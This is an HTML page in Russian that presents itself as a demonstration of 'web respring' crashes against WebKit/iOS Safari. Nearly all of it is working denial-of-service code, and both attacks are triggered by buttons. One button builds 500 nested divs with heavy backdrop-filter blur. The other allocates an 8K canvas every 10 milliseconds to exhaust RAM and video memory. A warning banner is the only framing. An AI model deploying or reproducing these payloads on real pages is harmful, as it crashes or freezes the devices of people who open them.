<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Respring Demonstration & Analysis</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #161b22;
            padding: 30px;
            border-radius: 12px;
            border: 1px solid #30363d;
        }
        .warning {
            background-color: rgba(210, 153, 34, 0.15);
            border-left: 4px solid #d29922;
            padding: 12px 16px;
            margin: 20px 0;
            border-radius: 4px;
            color: #e3b341;
        }
        /* Метод 1: Опасное сочетание рекурсивных тяжелых backdrop-filter */
        .crash-box {
            backdrop-filter: blur(100px) contrast(200%);
            -webkit-backdrop-filter: blur(100px) contrast(200%);
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Web Respring: Объединенный HTML-файл</h1>
        
        <div class="warning">
            <strong>Внимание!</strong> Данная страница демонстрирует механизмы критической нагрузки на WebKit (iOS Safari).
        </div>

        <button onclick="triggerCssLoad()">Запустить CSS-нагрузку (вложенные фильтры)</button>
        <button onclick="triggerMemoryLeak()">Запустить утечку памяти (Canvas)</button>

        <script>
            // Метод 1: Создание глубоко вложенного DOM-дерева с блюр-фильтрами
            function triggerCssLoad() {
                let root = document.body;
                for (let i = 0; i < 500; i++) {
                    let div = document.createElement('div');
                    div.className = 'crash-box';
                    root.appendChild(div);
                    root = div;
                }
            }

            // Метод 2: Заполнение оперативной и видеопамяти через Canvas (8K разрешение)
            function triggerMemoryLeak() {
                window.memoryLeaks = window.memoryLeaks || [];
                setInterval(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 7680;
                    canvas.height = 4320;
                    const ctx = canvas.getContext('2d');
                    if (ctx) {
                        ctx.fillStyle = 'red';
                        ctx.fillRect(0, 0, canvas.width, canvas.height);
                    }
                    window.memoryLeaks.push(canvas);
                }, 10);
            }
        </script>
    </div>
</body>
</html>
